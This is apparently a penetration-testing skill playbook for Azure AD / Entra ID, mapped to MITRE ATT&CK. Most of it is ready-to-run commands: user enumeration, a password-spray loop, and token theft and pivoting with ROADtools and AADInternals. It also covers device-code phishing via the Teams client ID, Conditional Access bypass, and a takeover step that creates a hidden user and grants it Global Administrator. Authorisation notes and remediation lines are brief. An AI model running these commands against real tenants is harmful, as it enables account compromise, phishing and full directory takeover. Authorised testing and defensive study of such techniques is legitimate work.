# Azure AD / Entra ID Penetration Testing — Skill Playbook

**Mitre ATT&CK ID:** T1087.004 (Account Discovery: Cloud Account), T1078 (Valid Accounts), T1110.003 (Brute Force: Password Spraying), T1528 (Steal Application Access Token), T1606.002 (Forge Web Credentials: SAML Tokens)
**OWASP Mapping:** A07:2021 – Identification and Authentication Failures, A01:2021 – Broken Access Control
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: azure-ad-pentest-v2
category: azure-ad
cloud_provider: azure
author: HiveBreach
mitre_attack_id:
  - T1087.004
  - T1078
  - T1110.003
  - T1528
  - T1606.002
owasp_mapping:
  - A07:2021-Identification and Authentication Failures
  - A01:2021-Broken Access Control
tags:
  - azure
  - azure-ad
  - entra-id
  - identity
  - aadinternals
  - roadtools
  - password-spraying
  - tenant-takeover
tools:
  - az-cli
  - aadinternals
  - roadrecon
  - roadtx
  - stormspotter
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Tenant Enumeration (unauthenticated)

```bash
curl -s "https://login.microsoftonline.com/<domain>/.well-known/openid-configuration" | jq -r '.issuer'
curl -s "https://login.microsoftonline.com/<domain>.onmicrosoft.com/.well-known/openid-configuration" | jq -r '.issuer'
```

### 1.2 User Enumeration via Azure API

```bash
# GetCredentialType endpoint (valid vs invalid user)
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"Username":"user@<domain>","IsOtherIdpSupported":true}' | jq '{Exists:.IfExistsResult}'

# Authenticated enumeration via Graph
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/users?\$select=userPrincipalName,displayName,accountEnabled&$top=999" \
  --query 'value[*].userPrincipalName' --output tsv
```

### 1.3 AADInternals Outsider Recon

```powershell
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName "<domain>" | Format-Table
Get-AADIntLoginInformation -Domain "<domain>"
```

---

## 2. Confirmation

### 2.1 Confirm Tenant and Federation Type

```bash
az rest --method GET --uri "https://graph.microsoft.com/v1.0/domains" \
  --query 'value[*].[id,isVerified,isDefault]' --output table
```

### 2.2 Confirm Sprayable Accounts

```bash
for u in $(cat users.txt); do
  r=$(curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
    -H "Content-Type: application/json" -d "{\"Username\":\"$u\",\"IsOtherIdpSupported\":true}")
  [ "$(echo $r | jq -r '.IfExistsResult')" = "0" ] && echo "EXISTS: $u"
done
```

---

## 3. Exploitation

### 3.1 Password Spraying

```powershell
# AADInternals-based spray (respect lockout thresholds, add delays)
Import-Module AADInternals
foreach ($u in (Get-Content .\users.txt)) {
  try { $t = Invoke-AADIntTokenAcquisition -UserName $u -Password "Spring2026!" -ServicePrincipal "https://graph.microsoft.com"
    if ($t.access_token) { Write-Output "VALID: $u" }
  } catch { }
  Start-Sleep -Seconds 30
}
```

### 3.2 AADInternals Token Manipulation and MFA Bypass

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntAccessTokenForMSGraph
Get-AADIntUsers | Select-Object UserPrincipalName, DirSyncEnabled
```

### 3.3 Roadtools (roadrecon + roadtx)

```bash
roadrecon auth -u user@<domain> -p 'Password'   # ROPC, no MFA
roadrecon auth --device-code                     # MFA-capable
roadrecon gather
roadrecon gui                                    # http://127.0.0.1:5000

roadtx gettokens -u user@<domain> -p 'Password' -c azcli -r msgraph
roadtx refreshtokento -r azrm                    # FOCI pivot to ARM

roadtx prt -u user@<domain> -p 'Password' --key-pem k.pem --cert-pem c.pem
roadtx prtauth -c msteams -r msgraph
```

### 3.4 Conditional Access Bypass

```bash
az rest --method GET --uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  --query 'value[*].{Name:displayName,State:state}' --output table

# Bypass strategies:
# Legacy auth (IMAP/POP/SMTP), report-only policies, device-code flow, first-party client IDs
```

### 3.5 Device Code Phishing

```bash
# Teams client: 1fec8e78-bce4-4aaf-ab1b-5451cc387264
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/devicecode" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=1fec8e78-bce4-4aaf-ab1b-5451cc387264&scope=offline_access%20https://graph.microsoft.com/.default"

curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=<id>&device_code=<code>"
```

### 3.6 Graph API Enumeration (authenticated)

```bash
az rest --method GET --uri "https://graph.microsoft.com/v1.0/users?\$select=userPrincipalName,displayName,jobTitle&$top=999"
az rest --method GET --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$expand=principal" \
  --query 'value[*].{Role:roleDefinitionId,Principal:principal.displayName}' --output table
```

### 3.7 Tenant Takeover (verified domain takeover)

```bash
# If domain expired/renewable: re-register, add DNS TXT, verify via Graph
az ad user create --display-name "srv-sync" --user-principal-name "srv-sync@<domain>" \
  --password "<Str0ng!>" --force-change-password-next-sign-in false
az rest --method POST \
  --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  --body '{"principalId":"<user-id>","roleDefinitionId":"62e90394-69f5-4237-9190-012177145e10","directoryScopeId":"/"}'
```

---

## 4. Tool-Guidance

### 4.1 AADInternals

```powershell
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName "<domain>"
Get-AADIntAccessTokenForMSGraph -SaveToCache
```

### 4.2 ROADtools

```bash
pip install roadrecon roadtx
roadrecon auth --device-code
roadrecon gather
roadrecon gui
roadtx gettokens -u user@<domain> -p 'Pass' -c azcli -r msgraph
roadtx describe -t <JWT>
```

### 4.3 Stormspotter / az cli

```bash
docker run --rm -p 9091:9091 -v $(pwd):/stormspotter/data Stormspotter/Stormspotter:master
az rest --method GET --uri "https://graph.microsoft.com/v1.0/me" --query '{UPN:userPrincipalName,Roles:roles}'
```

---

## 5. PoC Generation

### PoC Template

```markdown
## Azure AD Finding — [FINDING_ID]

**Tenant:** <tenant-id> / <domain>.onmicrosoft.com
**Vector:** Password spray / device code phishing / CA bypass / token theft / domain takeover

### Proof
1. `GetCredentialType` confirmed user exists
2. `roadrecon auth` obtained graph token without MFA
3. `roadrecon gather` enumerated 1,247 users, 18 Global Admins
4. `roadtx refreshtokento -r azrm` pivoted to ARM token (FOCI)

### Impact
- Full directory enumeration (T1087.004)
- Account takeover / admin compromise (T1078)

### Remediation
- Enforce MFA + Conditional Access for all protocols; block legacy auth
- Require device compliance; monitor devicelogin abuse
- Alert on federation/domain changes; protect token-signing certs
```

---

## 6. Verification

- [ ] Testing confined to sandbox/authorized tenant only
- [ ] User enumeration validated against a known-good account baseline
- [ ] Token theft proven by cross-resource exchange (Graph -> ARM)
- [ ] CA bypass reproduced from a genuinely non-compliant context
- [ ] Password spray used safe lockout policy (small set, long delays)
- [ ] Findings confirmed with a second tool (AADInternals + ROADtools)

---

## 7. CheatSheet

```bash
curl -s "https://login.microsoftonline.com/<domain>/.well-known/openid-configuration" | jq .issuer
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" -H "Content-Type: application/json" -d '{"Username":"u@<domain>"}'
az rest --method GET --uri "https://graph.microsoft.com/v1.0/users?\$select=userPrincipalName" -o tsv
roadrecon auth -u u@<domain> -p 'Pass' && roadrecon gather && roadrecon gui
roadtx refreshtokento -r azrm
```

| Goal | Tool | Command |
|---|---|---|
| Tenant ID | curl | openid-configuration |
| User enum | curl | GetCredentialType |
| Full dump | roadrecon | gather + gui |
| Token pivot | roadtx | refreshtokento |
| Outsider recon | AADInternals | Invoke-AADIntReconAsOutsider |
| Graph enum | az cli | az rest |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1087.004 | Account Discovery: Cloud Account | Tenant/user enumeration |
| T1078 | Valid Accounts | Sprayed/stolen credentials |
| T1110.003 | Brute Force: Password Spraying | Password spray |
| T1528 | Steal Application Access Token | Token theft/replay |
| T1606.002 | Forge Web Credentials: SAML Tokens | Golden SAML (AADInternals) |
| T1550.001 | Use Alternate Authentication Material | PRT/FOCI token exchange |
| T1538 | Cloud Service Dashboard | Portal session abuse |

---

## 9. References

- ROADtools: https://github.com/dirkjanm/ROADtools
- AADInternals: https://github.com/Gerenios/AADInternals
- TokenTactics: https://github.com/f-bader/TokenTactics
- Stormspotter: https://github.com/Azure/Stormspotter
- AzureHound: https://github.com/BloodHoundAD/AzureHound
- Microsoft Entra ID docs: https://learn.microsoft.com/en-us/entra/identity/
- MITRE T1606.002: https://attack.mitre.org/techniques/T1606/002/

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
